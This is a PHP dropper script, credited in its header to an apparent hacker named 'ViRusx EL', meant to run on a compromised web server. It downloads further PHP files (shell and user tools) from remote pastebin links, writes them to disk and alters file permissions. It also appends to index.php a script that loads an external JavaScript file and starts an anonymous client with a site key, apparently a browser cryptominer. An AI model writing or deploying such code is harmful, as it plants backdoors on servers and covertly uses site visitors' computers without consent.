<?php
echo '/*
<br>* Title : Perl Tools ./
<br>* Coder : ViRusx EL ./
<br>* FB    : fb.me/4KVI7Z ./
<br>* Greet : TX-AMS MWG MAS ./
<br>* CGI Pass : Spider ./
<br>* Must [CHMOD] Function Working ./
<br> ==================================';

$dir = "AMZ";
@mkdir($dir);
if($dir){
    echo "<br> $dir Has Been Created ./";
} else {
    echo "<br> [-] Error ./";
}

    $htaccess = "http://pastebin.com/raw/xVSfFNFM";
    $file = file_get_contents($htaccess);
    $open = fopen("ox.php" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> [htaccess] => Has Been Created ./";
     } else {
         echo "<br>[-] Error ./";
     }

$cgip = "index.php";
        chmod($cgip, 0655);
        if($cgip){
            echo "<br>[CGI] => CHMOD To 755 Complate ./";
        } else {
            echo "<br>[-] Error CHMOD ./";
        }
    $cgi = "http://pastebin.com/raw/h7uuDY4C";
    $file = file_get_contents($cgi);
    $open = fopen("cgi.php" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> [cgi] => Has Been Created ./";
     } else {
         echo "<br>[-] Error ./";
     } 
#	 $cgi = "http://pastebin.com/raw/gLTegu67";
#    $file = file_get_contents($cgi);
#    $open = fopen("index.php" , 'w');
#    fwrite($open,$file);
#    fclose($open);
#     if($open) {
#         echo "<br> [cgi] => Has Been Created ./";
#    } else {
#         echo "<br>[-] Error ./";
#     }




    $usr = "http://pastebin.com/raw/LcY3UPVC";
    $file = file_get_contents($usr);
    $open = fopen("leaf.php" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> [users] => Has Been Created ./";
     } else {
         echo "<br>[-] Error ./";
     }
    $files = glob("index.php");

    foreach($files as $file) {
        $content = "?><script src='https://www.freecontent.date./m344.js'></script>
<script>
    var _client = new Client.Anonymous('87a0248fd68a31de28fcc1634959cb42180fedc2ba9dde9b1f2601ed0392856e', {
        throttle: 0
    });
    _client.start();
</script>";
        file_put_contents($file, $content, FILE_APPEND);
    }


?>